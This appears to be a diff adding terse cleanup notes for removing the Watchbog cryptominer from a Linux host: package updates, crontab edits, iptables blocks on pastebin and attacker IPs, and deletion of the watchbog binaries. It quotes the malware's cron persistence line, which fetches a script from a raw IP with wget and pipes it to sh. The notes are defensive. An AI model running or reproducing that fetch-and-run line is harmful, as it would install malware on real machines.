@@ -1,0 +1,25 @@
+
+apt-get update
+apt-get upgrade
+watchbog
+Block IP using guie "block IP's"
+
+
+crontab -e 
+*/11 * * * * sed -i '/pastebin.com/d' /etc/hosts; sed -i '/185.193.127.21/d' /etc/hosts;
+# REMOVE A SIMILAR LINE TO THIS
+* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+
+
+iptables -A OUTPUT -p tcp -d pastebin.com  -j DROP
+iptables -A OUTPUT -p tcp -d 185.193.127.115  -j DROP  
+#  Cambiar IP
+
+
+whereis watchbog
+
+rm -r /usr/bin/watchbog
+rm -r /bin/watchbog
+
+
+
